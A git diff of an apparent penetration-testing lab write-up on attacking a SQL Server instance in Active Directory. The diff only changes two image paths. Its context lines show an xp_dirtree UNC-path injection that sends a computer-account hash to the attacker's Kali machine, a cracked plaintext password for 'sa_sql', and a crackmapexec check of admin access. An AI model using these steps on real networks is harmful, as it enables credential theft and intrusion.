@@ -91,7 +91,7 @@ Get-SQLQuery -Query "EXEC xp_dirtree '\\192.168.248.2\pwn', 1, 1" -Instance web0
 
 The part `EXEC xp_dirtree '\\192.168.248.2\pwn', 1, 1` is the SQL query which will execute the UNC PATH injection attack. After executing the command we receive the hash of the computeraccount on our kali machine:
 
-![](<../../../.gitbook/assets/image (10) (1).png>)
+![](<../../../.gitbook/assets/image (10) (1) (1).png>)
 
 Since its a computer account hash we wont be able to crack it. How do we know its a computer account hash? Computer accounts ends with a Dollar sign $. We could always double check by quering the domain and check if its a computer of normal user or search it up in the bloodhound data.
 
@@ -140,7 +140,7 @@ Hashcat cracked it within second since the user has a weak password:
 
 4\. The password for `sa_sql` is `IIoveyou2`. We can check if we can access the SQL Server with this account using crackmapexec, which will authenticate over SMB. If it shows Pwn3d we are localadmin.
 
-![](<../../../.gitbook/assets/image (9) (1) (1).png>)
+![](<../../../.gitbook/assets/image (9) (1) (1) (1).png>)
 
 The password is correct but the user isn't local admin unfortunately. But the user can be used to exploit something. We will continue with the attack on the following page.
 
